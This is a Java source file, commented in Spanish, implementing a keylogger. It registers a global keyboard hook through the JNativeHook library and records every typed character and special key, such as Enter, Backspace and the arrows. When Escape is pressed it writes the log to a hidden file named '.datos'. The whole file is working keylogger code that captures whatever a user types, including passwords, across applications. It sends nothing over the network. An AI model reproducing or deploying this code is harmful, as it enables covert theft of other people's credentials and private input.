package keylogger;

//Importando las clases necesarias para realizar el Key Logger.
import com.sun.glass.events.KeyEvent;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Clase principal del Key Logger, la cual implementa una interfaz llamada NativeKeyListener. 
 * @author rafael
 */
public class KeyLogger implements NativeKeyListener{

    /**
     * Aqui se encuentran los atributos utilizados por la clase, los cuales nos sirven para almacenar cadenas de
     * texto, maniuplar flujos de caracteres y escribir en un archivo. De igual forma, se encuentra un caracter,
     * el cual servira para ir almacenando la tecla pulsada por el usuario en la ejecucion.
     */
    StringBuffer texto = new StringBuffer("");
    BufferedWriter bw;
    PrintWriter salida;
    FileWriter fw;
    
    /**
     * Constructor de la clase, en donde se utiliza la clase GlobalScreen para obtener la entrada 
     * basica de la pantalla, a ala cual Java no tiene acceso regularmente y, mediante el metodo
     * registerNativeHook(), se especifica que se hara uso de un listener global.
     * Lo anterior se pone en un bloque try-catch, pues se puede originar la excepcion de que 
     * ya exista uno o se cree algun conflicto. 
     * Por ultimo, se crea el listener que estara a la espera de informacion tecleada.
     */
    KeyLogger(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.getInstance().addNativeKeyListener(this);
    }
    
    /**
     * Metodo principal que crea un objeto para poder utilizar el Key Logger.
     * @param args 
     */
    public static void main(String[] args) {
        KeyLogger m = new KeyLogger();
    }
    
    /**
     * Este sera el metodo principal encargado de ir escribiendo las teclas presionadas por el usuario
     * en un archivo, por lo que, se utiliza un FileWriter para abrir el flujo de caracteres con el 
     * archivo. Todas las teclas presionadas por el usuario se almacenan en un StringBuffer. Se utiliza
     * un switch para identificar 
     * Se utiliza un switch para que, una vez que el usuario presione la tecla escape, 
     * entonces se finalice la ejecucion del Key Logger. 
     * 
     * @param nke 
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        //System.out.println("Se presiono una tecla");
        switch(nke.getKeyCode()){
            case KeyEvent.VK_ESCAPE:{
                try {
                    this.fw = new FileWriter(".datos");
                    bw = new BufferedWriter(fw);
                    salida = new PrintWriter(bw);
                    salida.println(texto);
                    salida.close();
                } catch (Exception e) {}
                System.exit(0);
            }break;
            case KeyEvent.VK_ENTER:{
                texto.append("\n {Enter} ");
            }break;
            case KeyEvent.VK_BACKSPACE:{
                texto.append("\n {BACKSPACE} ");
            }break;
            case KeyEvent.VK_NUM_LOCK:{
                texto.append("\n {NUM_LOCK} ");
            }break;
            case KeyEvent.VK_LEFT:{
                texto.append("\n {LEFT} ");
            }break;
            case KeyEvent.VK_RIGHT:{
                texto.append("\n {RIGHT} ");
            }break;
            case KeyEvent.VK_UP:{
                texto.append("\n {UP} ");
            }break;
            case KeyEvent.VK_DOWN:{
                texto.append("\n {DOWN} ");
            }break;
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        //System.out.println("Se solto una tecla");
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        texto.append(nke.getKeyChar());
    }
    
}
